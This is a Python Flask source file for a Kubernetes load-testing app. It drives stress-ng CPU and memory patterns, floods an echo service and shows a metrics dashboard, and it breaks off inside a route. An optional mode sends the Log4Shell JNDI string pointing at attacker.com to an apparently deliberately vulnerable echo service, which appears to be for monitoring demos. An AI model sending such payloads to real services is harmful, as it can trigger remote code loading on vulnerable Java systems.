#!/usr/bin/env python3
"""
Load Testing Application v3.0 for Turbonomic and Instana Testing
Sophisticated load generator with continuous stress patterns, echo service
integration, and real-time metrics.
"""

import os
import time
import json
import uuid
import math
import logging
import subprocess
import threading
from collections import deque
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string
import psutil
import requests

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ---------------------------------------------------------------------------
# Configuration from environment
# ---------------------------------------------------------------------------
POD_NAME = os.environ.get("POD_NAME", "unknown-pod")
POD_NAMESPACE = os.environ.get("POD_NAMESPACE", "load-testing")
NODE_NAME = os.environ.get("NODE_NAME", "unknown-node")
ECHO_SERVICE_URL = os.environ.get('ECHO_SERVICE_URL', 'http://vulnerable-echo-service:8085')

# ---------------------------------------------------------------------------
# Thread-safe metrics store
# ---------------------------------------------------------------------------
_metrics_lock = threading.Lock()

metrics = {
    'requests_total': 0,
    'stress_tests_started': 0,
    'stress_tests_completed': 0,
    'stress_tests_failed': 0,
    'echo_requests_total': 0,
    'echo_requests_success': 0,
    'echo_requests_failed': 0,
    'echo_flood_requests': 0,
    'cpu_usage': 0.0,
    'memory_usage': 0.0,
    'last_echo_response_time_ms': 0.0,
    'avg_echo_response_time_ms': 0.0,
}

# Rolling window of echo response times for averages
_echo_times = deque(maxlen=500)

def inc_metric(key, value=1):
    with _metrics_lock:
        metrics[key] = metrics.get(key, 0) + value

def set_metric(key, value):
    with _metrics_lock:
        metrics[key] = value

def get_metrics_snapshot():
    with _metrics_lock:
        return dict(metrics)

# ---------------------------------------------------------------------------
# Active jobs registry (thread-safe)
# ---------------------------------------------------------------------------
_jobs_lock = threading.Lock()
_active_jobs = {}   # job_id -> {type, params, started, thread, process, ...}

def register_job(job_id, job_type, params, thread=None, process=None):
    with _jobs_lock:
        _active_jobs[job_id] = {
            'type': job_type,
            'params': params,
            'started': datetime.now().isoformat(),
            'thread': thread,
            'process': process,
            'stop_event': threading.Event(),
        }
    return _active_jobs[job_id]

def unregister_job(job_id):
    with _jobs_lock:
        _active_jobs.pop(job_id, None)

def get_active_jobs_info():
    with _jobs_lock:
        return [
            {
                'job_id': jid,
                'type': j['type'],
                'params': j['params'],
                'started': j['started'],
                'running': j['thread'].is_alive() if j.get('thread') else False,
            }
            for jid, j in _active_jobs.items()
        ]

def active_stress_count():
    with _jobs_lock:
        return sum(1 for j in _active_jobs.values()
                   if j['type'] in ('stress', 'ramp', 'wave') and
                   j.get('thread') and j['thread'].is_alive())

# ---------------------------------------------------------------------------
# System metrics collector
# ---------------------------------------------------------------------------
def collect_system_metrics():
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        set_metric('cpu_usage', cpu)
        set_metric('memory_usage', mem.percent)
        return {
            'cpu_percent': cpu,
            'memory_percent': mem.percent,
            'memory_available_gb': round(mem.available / (1024**3), 2),
            'memory_total_gb': round(mem.total / (1024**3), 2),
            'cpu_count': psutil.cpu_count(),
            'timestamp': datetime.now().isoformat(),
        }
    except Exception as e:
        logger.error(f"Error collecting system metrics: {e}")
        return {}

def _metrics_loop():
    while True:
        try:
            collect_system_metrics()
        except Exception:
            pass
        time.sleep(5)

# ---------------------------------------------------------------------------
# stress-ng runner (non-blocking)
# ---------------------------------------------------------------------------
MAX_CONCURRENT_STRESS = 4

def _run_stress_ng_job(job_id, cpu_workers, memory_workers, duration, memory_size):
    """Run stress-ng in a background thread. Non-blocking.
    Uses --cpu-method matrixprod which works reliably in restricted containers.
    Falls back to CPU-only if vm stressor fails.
    """
    # Build command - use matrixprod method which doesn't need special caps
    cmd = [
        'stress-ng',
        '--temp-path', '/tmp',
        '--cpu', str(cpu_workers),
        '--cpu-method', 'matrixprod',
        '--timeout', f'{duration}s',
        '--metrics-brief',
    ]

    # Add memory stressor if requested
    if memory_workers > 0:
        cmd.extend([
            '--vm', str(memory_workers),
            '--vm-bytes', memory_size,
            '--vm-method', 'all',
        ])

    logger.info(f"[{job_id}] Starting stress-ng: {' '.join(cmd)}")
    inc_metric('stress_tests_started')

    try:
        env = os.environ.copy()
        env['TMPDIR'] = '/tmp'
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            cwd='/tmp', env=env,
        )
        with _jobs_lock:
            if job_id in _active_jobs:
                _active_jobs[job_id]['process'] = process

        output, _ = process.communicate()

        if process.returncode == 0:
            inc_metric('stress_tests_completed')
            logger.info(f"[{job_id}] stress-ng finished successfully")
        else:
            # If failed with vm stressor, retry CPU-only
            if memory_workers > 0:
                logger.warning(f"[{job_id}] stress-ng failed (code {process.returncode}), retrying CPU-only")
                logger.warning(f"[{job_id}] output: {output[:500] if output else 'none'}")
                cmd_cpu = [
                    'stress-ng',
                    '--temp-path', '/tmp',
                    '--cpu', str(cpu_workers),
                    '--cpu-method', 'matrixprod',
                    '--timeout', f'{duration}s',
                    '--metrics-brief',
                ]
                process2 = subprocess.Popen(
                    cmd_cpu, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
                )
                with _jobs_lock:
                    if job_id in _active_jobs:
                        _active_jobs[job_id]['process'] = process2
                output2, _ = process2.communicate()
                if process2.returncode == 0:
                    inc_metric('stress_tests_completed')
                    logger.info(f"[{job_id}] stress-ng CPU-only finished successfully")
                else:
                    inc_metric('stress_tests_failed')
                    logger.warning(f"[{job_id}] stress-ng CPU-only also failed (code {process2.returncode})")
                    logger.warning(f"[{job_id}] output: {output2[:500] if output2 else 'none'}")
            else:
                inc_metric('stress_tests_failed')
                logger.warning(f"[{job_id}] stress-ng exited with code {process.returncode}")
                logger.warning(f"[{job_id}] output: {output[:500] if output else 'none'}")

    except FileNotFoundError:
        inc_metric('stress_tests_failed')
        logger.error(f"[{job_id}] stress-ng not installed")
    except Exception as e:
        inc_metric('stress_tests_failed')
        logger.error(f"[{job_id}] stress-ng error: {e}")
    finally:
        unregister_job(job_id)


def start_stress(cpu_workers=2, memory_workers=1, duration=30, memory_size="256M"):
    """Start a stress test (non-blocking). Returns job_id."""
    if active_stress_count() >= MAX_CONCURRENT_STRESS:
        return None, "Maximum concurrent stress tests reached"

    job_id = f"stress-{uuid.uuid4().hex[:8]}"
    params = dict(cpu_workers=cpu_workers, memory_workers=memory_workers,
                  duration=duration, memory_size=memory_size)
    t = threading.Thread(target=_run_stress_ng_job, daemon=True,
                         args=(job_id, cpu_workers, memory_workers, duration, memory_size))
    register_job(job_id, 'stress', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# Ramp pattern: linearly increase CPU workers over time
# ---------------------------------------------------------------------------
def _run_ramp_job(job_id, max_workers, step_duration, steps, memory_size):
    """Ramp up CPU load step by step."""
    logger.info(f"[{job_id}] Starting ramp: {steps} steps, max_workers={max_workers}")
    inc_metric('stress_tests_started')
    job = _active_jobs.get(job_id)

    try:
        for step in range(1, steps + 1):
            if job and job['stop_event'].is_set():
                logger.info(f"[{job_id}] Ramp stopped at step {step}")
                break

            workers = max(1, int(max_workers * step / steps))
            cmd = [
                'stress-ng', '--temp-path', '/tmp',
                '--cpu', str(workers),
                '--cpu-method', 'matrixprod',
                '--timeout', f'{step_duration}s',
                '--metrics-brief',
            ]
            logger.info(f"[{job_id}] Ramp step {step}/{steps}: {workers} CPU workers")

            env = os.environ.copy()
            env['TMPDIR'] = '/tmp'
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True,
                                    cwd='/tmp', env=env)
            with _jobs_lock:
                if job_id in _active_jobs:
                    _active_jobs[job_id]['process'] = proc

            proc.communicate()

        inc_metric('stress_tests_completed')
        logger.info(f"[{job_id}] Ramp completed")
    except Exception as e:
        inc_metric('stress_tests_failed')
        logger.error(f"[{job_id}] Ramp error: {e}")
    finally:
        unregister_job(job_id)


def start_ramp(max_workers=8, step_duration=15, steps=5, memory_size="256M"):
    if active_stress_count() >= MAX_CONCURRENT_STRESS:
        return None, "Maximum concurrent stress tests reached"
    job_id = f"ramp-{uuid.uuid4().hex[:8]}"
    params = dict(max_workers=max_workers, step_duration=step_duration,
                  steps=steps, memory_size=memory_size)
    t = threading.Thread(target=_run_ramp_job, daemon=True,
                         args=(job_id, max_workers, step_duration, steps, memory_size))
    register_job(job_id, 'ramp', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# Wave / sine pattern: oscillating CPU load
# ---------------------------------------------------------------------------
def _run_wave_job(job_id, max_workers, period_sec, total_duration, memory_size):
    """Generate a sine-wave CPU load pattern."""
    logger.info(f"[{job_id}] Starting wave: period={period_sec}s, duration={total_duration}s")
    inc_metric('stress_tests_started')
    job = _active_jobs.get(job_id)
    step_len = 10  # seconds per sub-step

    try:
        elapsed = 0
        while elapsed < total_duration:
            if job and job['stop_event'].is_set():
                break

            # Sine wave: 1 .. max_workers
            frac = (math.sin(2 * math.pi * elapsed / period_sec) + 1) / 2
            workers = max(1, int(frac * max_workers))
            remaining = min(step_len, total_duration - elapsed)

            cmd = [
                'stress-ng', '--temp-path', '/tmp',
                '--cpu', str(workers),
                '--cpu-method', 'matrixprod',
                '--timeout', f'{remaining}s',
            ]
            logger.info(f"[{job_id}] Wave t={elapsed}s: {workers} CPU workers")

            env = os.environ.copy()
            env['TMPDIR'] = '/tmp'
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True,
                                    cwd='/tmp', env=env)
            with _jobs_lock:
                if job_id in _active_jobs:
                    _active_jobs[job_id]['process'] = proc
            proc.communicate()

            elapsed += remaining

        inc_metric('stress_tests_completed')
        logger.info(f"[{job_id}] Wave completed")
    except Exception as e:
        inc_metric('stress_tests_failed')
        logger.error(f"[{job_id}] Wave error: {e}")
    finally:
        unregister_job(job_id)


def start_wave(max_workers=8, period_sec=60, total_duration=120, memory_size="256M"):
    if active_stress_count() >= MAX_CONCURRENT_STRESS:
        return None, "Maximum concurrent stress tests reached"
    job_id = f"wave-{uuid.uuid4().hex[:8]}"
    params = dict(max_workers=max_workers, period_sec=period_sec,
                  total_duration=total_duration, memory_size=memory_size)
    t = threading.Thread(target=_run_wave_job, daemon=True,
                         args=(job_id, max_workers, period_sec, total_duration, memory_size))
    register_job(job_id, 'wave', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# Echo service caller
# ---------------------------------------------------------------------------
def call_echo_service(message, method='POST', vulnerable_payload=False):
    """Call the vulnerable echo service once."""
    start = time.time()

    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'LoadTestApp/3.0',
        }

        if vulnerable_payload:
            vuln_str = "${jndi:ldap://attacker.com/exploit}"
            headers['X-Vulnerable-Header'] = vuln_str
            headers['X-Log4j-Test'] = vuln_str
            message = f"{message} - VULNERABLE: {vuln_str}"

        if method.upper() == 'POST':
            resp = requests.post(
                f"{ECHO_SERVICE_URL}/echo",
                json={'message': message, 'timestamp': datetime.now().isoformat()},
                headers=headers, timeout=10,
            )
        else:
            resp = requests.get(
                f"{ECHO_SERVICE_URL}/echo",
                params={'message': message},
                headers=headers, timeout=10,
            )

        elapsed_ms = round((time.time() - start) * 1000, 2)
        inc_metric('echo_requests_total')
        _echo_times.append(elapsed_ms)
        set_metric('last_echo_response_time_ms', elapsed_ms)
        if _echo_times:
            set_metric('avg_echo_response_time_ms',
                        round(sum(_echo_times) / len(_echo_times), 2))

        if resp.status_code == 200:
            inc_metric('echo_requests_success')
            try:
                body = resp.json()
            except ValueError:
                body = {'raw': resp.text}
            return {
                'success': True, 'response': body,
                'status_code': 200, 'method': method,
                'vulnerable_payload': vulnerable_payload,
                'response_time_ms': elapsed_ms,
            }
        else:
            inc_metric('echo_requests_failed')
            return {
                'success': False, 'error': f"HTTP {resp.status_code}: {resp.text}",
                'status_code': resp.status_code,
                'response_time_ms': elapsed_ms, 'method': method,
            }

    except requests.RequestException as e:
        elapsed_ms = round((time.time() - start) * 1000, 2)
        inc_metric('echo_requests_total')
        inc_metric('echo_requests_failed')
        return {
            'success': False, 'error': str(e),
            'response_time_ms': elapsed_ms, 'method': method,
        }

# ---------------------------------------------------------------------------
# Echo flood: sustained echo service load
# ---------------------------------------------------------------------------
def _run_echo_flood(job_id, rps, duration, vulnerable):
    """Send sustained requests to echo service."""
    logger.info(f"[{job_id}] Starting echo flood: {rps} rps for {duration}s")
    job = _active_jobs.get(job_id)
    delay = 1.0 / max(rps, 1)
    end_time = time.time() + duration
    count = 0

    try:
        while time.time() < end_time:
            if job and job['stop_event'].is_set():
                break
            call_echo_service(
                f"flood-{count} from {POD_NAME}",
                method='POST', vulnerable_payload=vulnerable,
            )
            inc_metric('echo_flood_requests')
            count += 1
            time.sleep(delay)

        logger.info(f"[{job_id}] Echo flood finished: {count} requests sent")
    except Exception as e:
        logger.error(f"[{job_id}] Echo flood error: {e}")
    finally:
        unregister_job(job_id)


def start_echo_flood(rps=5, duration=60, vulnerable=False):
    job_id = f"flood-{uuid.uuid4().hex[:8]}"
    params = dict(rps=rps, duration=duration, vulnerable=vulnerable)
    t = threading.Thread(target=_run_echo_flood, daemon=True,
                         args=(job_id, rps, duration, vulnerable))
    register_job(job_id, 'echo_flood', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# Cluster status via Kubernetes API (optional)
# ---------------------------------------------------------------------------
def get_cluster_stress_status():
    try:
        from kubernetes import client, config as k8s_config
        k8s_config.load_incluster_config()
    except Exception:
        return {'error': True, 'details': 'Not running in cluster or kubernetes package unavailable'}

    try:
        v1 = client.CoreV1Api()
        pods = v1.list_namespaced_pod(
            namespace=POD_NAMESPACE, label_selector="app=load-test-app"
        )
    except Exception as e:
        return {'error': True, 'details': str(e)}

    per_pod = []
    per_node = {}
    total = 0
    for pod in pods.items:
        pip = pod.status.pod_ip
        if not pip:
            continue
        try:
            r = requests.get(f"http://{pip}:8080/status", timeout=2)
            if r.status_code != 200:
                continue
            data = r.json()
            active = data.get('active_jobs', 0)
            total += active
            per_pod.append({
                'pod_name': pod.metadata.name,
                'node_name': pod.spec.node_name,
                'active_jobs': active,
            })
            per_node[pod.spec.node_name] = per_node.get(pod.spec.node_name, 0) + active
        except Exception:
            continue

    return {
        'error': False,
        'cluster_total': total,
        'per_pod': per_pod,
        'per_node': per_node,
        'namespace': POD_NAMESPACE,
        'timestamp': datetime.now().isoformat(),
    }

# ---------------------------------------------------------------------------
# Stop helpers
# ---------------------------------------------------------------------------
def stop_all_jobs():
    """Gracefully stop all running jobs."""
    stopped = 0
    with _jobs_lock:
        for jid, job in list(_active_jobs.items()):
            job['stop_event'].set()
            proc = job.get('process')
            if proc and proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
            stopped += 1
        _active_jobs.clear()
    return stopped


def stop_job(job_id):
    with _jobs_lock:
        job = _active_jobs.get(job_id)
        if not job:
            return False
        job['stop_event'].set()
        proc = job.get('process')
        if proc and proc.poll() is None:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        _active_jobs.pop(job_id, None)
    return True


# ============================================================================
# HTML TEMPLATE
# ============================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Load Testing App v3.0</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1100px; margin: 0 auto; }
        .header {
            text-align: center; padding: 30px 0 20px;
        }
        .header h1 {
            font-size: 2.2em; color: #00d2ff;
            text-shadow: 0 0 20px rgba(0,210,255,0.3);
        }
        .header .sub { color: #8899a6; margin-top: 8px; font-size: 1.05em; }
        .header .pod-info {
            margin-top: 10px; font-size: 0.9em; color: #5c6d7e;
            font-family: monospace;
        }

        /* Cards */
        .card {
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 20px;
            backdrop-filter: blur(10px);
        }
        .card h2 {
            font-size: 1.3em; color: #00d2ff; margin-bottom: 16px;
            border-bottom: 1px solid rgba(0,210,255,0.2);
            padding-bottom: 10px;
        }

        /* Metrics grid */
        .mgrid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px;
        }
        .mbox {
            background: rgba(0,210,255,0.08);
            border: 1px solid rgba(0,210,255,0.15);
            border-radius: 8px;
            padding: 14px 10px; text-align: center;
        }
        .mbox .val { font-size: 1.6em; font-weight: 700; color: #00d2ff; }
        .mbox .lbl { font-size: 0.78em; color: #8899a6; margin-top: 4px; }

        /* Active jobs */
        .job-row {
            display: flex; align-items: center; justify-content: space-between;
            padding: 10px 14px; margin: 6px 0;
            background: rgba(255,255,255,0.04); border-radius: 6px;
            font-size: 0.92em;
        }
        .job-row .tag {
            display: inline-block; padding: 2px 10px; border-radius: 12px;
            font-size: 0.8em; font-weight: 600; text-transform: uppercase;
        }
        .tag-stress { background: #e74c3c33; color: #e74c3c; }
        .tag-ramp   { background: #f39c1233; color: #f39c12; }
        .tag-wave   { background: #9b59b633; color: #9b59b6; }
        .tag-flood  { background: #2ecc7133; color: #2ecc71; }

        /* Forms */
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
        }
        .fg { margin-bottom: 14px; }
        .fg label { display: block; font-size: 0.85em; color: #8899a6; margin-bottom: 6px; font-weight: 600; }
        .fg input, .fg select {
            width: 100%; padding: 10px 12px;
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 6px; color: #e0e0e0;
            font-size: 0.95em;
        }
        .fg input:focus, .fg select:focus {
            outline: none; border-color: #00d2ff;
            box-shadow: 0 0 0 2px rgba(0,210,255,0.2);
        }
        .fg input[type="checkbox"] { width: auto; margin-right: 8px; }
        .cb-row { display: flex; align-items: center; margin: 10px 0; }

        /* Buttons */
        .btn {
            display: inline-block; padding: 10px 22px;
            border: none; border-radius: 6px;
            font-size: 0.95em; font-weight: 600;
            cursor: pointer; transition: all 0.2s;
            margin: 4px;
        }
        .btn:hover { transform: translateY(-1px); filter: brightness(1.15); }
        .btn-primary { background: linear-gradient(135deg, #00d2ff, #0083b0); color: #fff; }
        .btn-danger  { background: linear-gradient(135deg, #e74c3c, #c0392b); color: #fff; }
        .btn-warning { background: linear-gradient(135deg, #f39c12, #d68910); color: #1a1a2e; }
        .btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: #fff; }
        .btn-purple  { background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; }
        .btn-sm { padding: 6px 14px; font-size: 0.82em; }

        /* Tabs */
        .tabs { display: flex; gap: 4px; margin-bottom: 18px; flex-wrap: wrap; }
        .tab {
            padding: 8px 18px; border-radius: 6px 6px 0 0;
            background: rgba(255,255,255,0.05); color: #8899a6;
            cursor: pointer; font-size: 0.9em; font-weight: 600;
            border: 1px solid transparent; border-bottom: none;
        }
        .tab.active { background: rgba(0,210,255,0.1); color: #00d2ff; border-color: rgba(0,210,255,0.2); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* API section */
        .endpoint {
            padding: 8px 14px; margin: 4px 0; border-radius: 4px;
            background: rgba(255,255,255,0.04);
            font-family: 'Courier New', monospace; font-size: 0.88em;
        }
        .endpoint .method {
            display: inline-block; width: 50px;
            font-weight: 700; color: #2ecc71;
        }
        .endpoint .method.post { color: #f39c12; }

        .status-banner {
            padding: 14px; border-radius: 6px; margin: 10px 0;
            font-size: 0.92em;
        }
        .status-ok { background: rgba(46,204,113,0.15); border: 1px solid rgba(46,204,113,0.3); color: #2ecc71; }
        .status-err { background: rgba(231,76,60,0.15); border: 1px solid rgba(231,76,60,0.3); color: #e74c3c; }
        .status-warn { background: rgba(243,156,18,0.15); border: 1px solid rgba(243,156,18,0.3); color: #f39c12; }

        @media (max-width: 600px) {
            .form-grid { grid-template-columns: 1fr; }
            .mgrid { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>
<div class="container">

    <div class="header">
        <h1>Load Testing Application</h1>
        <div class="sub">v3.0 &mdash; Kubernetes Load Generator for Turbonomic &amp; Instana</div>
        <div class="pod-info">Pod: {{ pod_name }} | Node: {{ node_name }} | Echo: {{ echo_url }}</div>
    </div>

    <!-- LIVE METRICS -->
    <div class="card">
        <h2>System &amp; Application Metrics</h2>
        <div class="mgrid">
            <div class="mbox"><div class="val">{{ m.cpu_usage|round(1) }}%</div><div class="lbl">CPU Usage</div></div>
            <div class="mbox"><div class="val">{{ m.memory_usage|round(1) }}%</div><div class="lbl">Memory Usage</div></div>
            <div class="mbox"><div class="val">{{ active_jobs }}</div><div class="lbl">Active Jobs</div></div>
            <div class="mbox"><div class="val">{{ m.stress_tests_started }}</div><div class="lbl">Stress Started</div></div>
            <div class="mbox"><div class="val">{{ m.stress_tests_completed }}</div><div class="lbl">Stress Done</div></div>
            <div class="mbox"><div class="val">{{ m.echo_requests_total }}</div><div class="lbl">Echo Total</div></div>
            <div class="mbox"><div class="val">{{ m.echo_requests_success }}</div><div class="lbl">Echo OK</div></div>
            <div class="mbox"><div class="val">{{ m.echo_requests_failed }}</div><div class="lbl">Echo Fail</div></div>
            <div class="mbox"><div class="val">{{ m.avg_echo_response_time_ms }}ms</div><div class="lbl">Avg Response</div></div>
            <div class="mbox"><div class="val">{{ m.echo_flood_requests }}</div><div class="lbl">Flood Reqs</div></div>
        </div>
    </div>

    <!-- ACTIVE JOBS -->
    {% if jobs %}
    <div class="card">
        <h2>Active Jobs</h2>
        {% for j in jobs %}
        <div class="job-row">
            <div>
                <span class="tag tag-{{ j.type }}">{{ j.type }}</span>
                <span style="margin-left:10px;">{{ j.job_id }}</span>
                <span style="color:#5c6d7e; margin-left:10px; font-size:0.85em;">since {{ j.started }}</span>
            </div>
            <button class="btn btn-danger btn-sm" onclick="stopJob('{{ j.job_id }}')">Stop</button>
        </div>
        {% endfor %}
        <div style="margin-top:12px;">
            <button class="btn btn-danger" onclick="stopAll()">Stop All Jobs</button>
        </div>
    </div>
    {% endif %}

    <!-- LOAD GENERATION TABS -->
    <div class="card">
        <h2>Load Generation</h2>
        <div class="tabs">
            <div class="tab active" onclick="switchTab(event,'tab-stress')">Stress Test</div>
            <div class="tab" onclick="switchTab(event,'tab-ramp')">Ramp Up</div>
            <div class="tab" onclick="switchTab(event,'tab-wave')">Wave Pattern</div>
            <div class="tab" onclick="switchTab(event,'tab-echo')">Echo Service</div>
            <div class="tab" onclick="switchTab(event,'tab-flood')">Echo Flood</div>
        </div>

        <!-- STRESS TEST -->
        <div id="tab-stress" class="tab-content active">
            <p style="color:#8899a6; margin-bottom:16px;">Constant CPU &amp; memory load via stress-ng</p>
            <form method="post" action="/stress">
                <div class="form-grid">
                    <div class="fg"><label>CPU Workers</label><input type="number" name="cpu_workers" value="2" min="1" max="16"></div>
                    <div class="fg"><label>Memory Workers</label><input type="number" name="memory_workers" value="1" min="0" max="8"></div>
                    <div class="fg"><label>Duration (sec)</label><input type="number" name="duration" value="60" min="5" max="3600"></div>
                    <div class="fg"><label>Memory Size</label>
                        <select name="memory_size">
                            <option value="128M">128 MB</option>
                            <option value="256M" selected>256 MB</option>
                            <option value="512M">512 MB</option>
                        </select>
                    </div>
                </div>
                <button type="submit" class="btn btn-primary">Start Stress Test</button>
            </form>
        </div>

        <!-- RAMP UP -->
        <div id="tab-ramp" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Linearly increase CPU workers in steps (great for Turbonomic scaling tests)</p>
            <form method="post" action="/ramp">
                <div class="form-grid">
                    <div class="fg"><label>Max CPU Workers</label><input type="number" name="max_workers" value="8" min="1" max="16"></div>
                    <div class="fg"><label>Step Duration (sec)</label><input type="number" name="step_duration" value="20" min="5" max="300"></div>
                    <div class="fg"><label>Number of Steps</label><input type="number" name="steps" value="5" min="2" max="20"></div>
                    <div class="fg"><label>Memory Size</label>
                        <select name="memory_size">
                            <option value="128M">128 MB</option>
                            <option value="256M" selected>256 MB</option>
                            <option value="512M">512 MB</option>
                        </select>
                    </div>
                </div>
                <button type="submit" class="btn btn-warning">Start Ramp Up</button>
            </form>
        </div>

        <!-- WAVE -->
        <div id="tab-wave" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Sine-wave oscillating CPU load &mdash; simulates realistic traffic patterns</p>
            <form method="post" action="/wave">
                <div class="form-grid">
                    <div class="fg"><label>Max CPU Workers</label><input type="number" name="max_workers" value="8" min="1" max="16"></div>
                    <div class="fg"><label>Wave Period (sec)</label><input type="number" name="period_sec" value="60" min="20" max="600"></div>
                    <div class="fg"><label>Total Duration (sec)</label><input type="number" name="total_duration" value="180" min="30" max="3600"></div>
                    <div class="fg"><label>Memory Size</label>
                        <select name="memory_size">
                            <option value="128M">128 MB</option>
                            <option value="256M" selected>256 MB</option>
                            <option value="512M">512 MB</option>
                        </select>
                    </div>
                </div>
                <button type="submit" class="btn btn-purple">Start Wave</button>
            </form>
        </div>

        <!-- ECHO SERVICE SINGLE -->
        <div id="tab-echo" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Send a single request to the vulnerable Java Echo Service (Log4j CVE-2021-44228)</p>
            <form method="post" action="/echo">
                <div class="fg"><label>Message</label><input type="text" name="message" value="Hello from Load Test v3.0" style="max-width:500px;"></div>
                <div class="form-grid">
                    <div class="fg"><label>HTTP Method</label>
                        <select name="method">
                            <option value="POST" selected>POST</option>
                            <option value="GET">GET</option>
                        </select>
                    </div>
                </div>
                <div class="cb-row">
                    <input type="checkbox" name="vulnerable_payload" value="true" id="vuln1">
                    <label for="vuln1" style="color:#e74c3c;">Include Log4j vulnerable payload</label>
                </div>
                <button type="submit" class="btn btn-danger">Call Echo Service</button>
            </form>
        </div>

        <!-- ECHO FLOOD -->
        <div id="tab-flood" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Sustained echo service load &mdash; generates continuous network traffic and logging</p>
            <form method="post" action="/flood">
                <div class="form-grid">
                    <div class="fg"><label>Requests / sec</label><input type="number" name="rps" value="5" min="1" max="100"></div>
                    <div class="fg"><label>Duration (sec)</label><input type="number" name="duration" value="60" min="5" max="3600"></div>
                </div>
                <div class="cb-row">
                    <input type="checkbox" name="vulnerable" value="true" id="vuln2">
                    <label for="vuln2" style="color:#e74c3c;">Include Log4j vulnerable payloads</label>
                </div>
                <button type="submit" class="btn btn-success">Start Echo Flood</button>
            </form>
        </div>
    </div>

    <!-- CLUSTER STATUS -->
    <div class="card">
        <h2>Cluster-Wide Status</h2>
        {% if cluster.error %}
            <div class="status-banner status-warn">{{ cluster.details }}</div>
        {% else %}
            <div class="mgrid" style="max-width:400px;">
                <div class="mbox"><div class="val">{{ cluster.cluster_total }}</div><div class="lbl">Cluster Active Jobs</div></div>
                <div class="mbox"><div class="val">{{ cluster.per_pod|length }}</div><div class="lbl">Pods Reporting</div></div>
            </div>
            {% if cluster.per_pod %}
            <div style="margin-top:14px;">
                {% for p in cluster.per_pod %}
                <div class="job-row">
                    <span>{{ p.pod_name }}</span>
                    <span style="color:#5c6d7e;">{{ p.node_name }}</span>
                    <span style="color:#00d2ff; font-weight:600;">{{ p.active_jobs }} jobs</span>
                </div>
                {% endfor %}
            </div>
            {% endif %}
        {% endif %}
    </div>

    <!-- API REFERENCE -->
    <div class="card">
        <h2>API Reference</h2>
        <div class="endpoint"><span class="method">GET</span> / &mdash; Web dashboard</div>
        <div class="endpoint"><span class="method">GET</span> /health &mdash; Kubernetes health check</div>
        <div class="endpoint"><span class="method">GET</span> /metrics &mdash; Prometheus-style metrics</div>
        <div class="endpoint"><span class="method">GET</span> /status &mdash; Pod status &amp; active jobs</div>
        <div class="endpoint"><span class="method post">POST</span> /api/stress &mdash; Start stress test</div>
        <div class="endpoint"><span class="method post">POST</span> /api/ramp &mdash; Start ramp-up pattern</div>
        <div class="endpoint"><span class="method post">POST</span> /api/wave &mdash; Start wave pattern</div>
        <div class="endpoint"><span class="method post">POST</span> /api/echo &mdash; Single echo call</div>
        <div class="endpoint"><span class="method post">POST</span> /api/flood &mdash; Start echo flood</div>
        <div class="endpoint"><span class="method post">POST</span> /api/stop &mdash; Stop all jobs</div>
        <div class="endpoint"><span class="method post">POST</span> /api/stop/&lt;job_id&gt; &mdash; Stop specific job</div>
        <div class="endpoint"><span class="method">GET</span> /cluster-status &mdash; Cluster-wide status</div>
    </div>
</div>

<script>
function switchTab(e, id) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    e.target.classList.add('active');
    document.getElementById(id).classList.add('active');
}

function stopAll() {
    if (!confirm('Stop ALL active jobs?')) return;
    fetch('/stop', {method:'POST'}).then(r=>r.json()).then(d=>{
        alert(d.message); location.reload();
    });
}

function stopJob(jid) {
    fetch('/stop/'+jid, {method:'POST'}).then(r=>r.json()).then(d=>{
        alert(d.message); location.reload();
    });
}

// Auto-refresh every 15s
setTimeout(()=>location.reload(), 15000);
</script>
</body>
</html>
"""

# ============================================================================
# FLASK ROUTES
# ============================================================================

@app.route('/')
def index():
    inc_metric('requests_total')
    m = get_metrics_snapshot()
    jobs = get_active_jobs_info()
    cluster = get_cluster_stress_status()
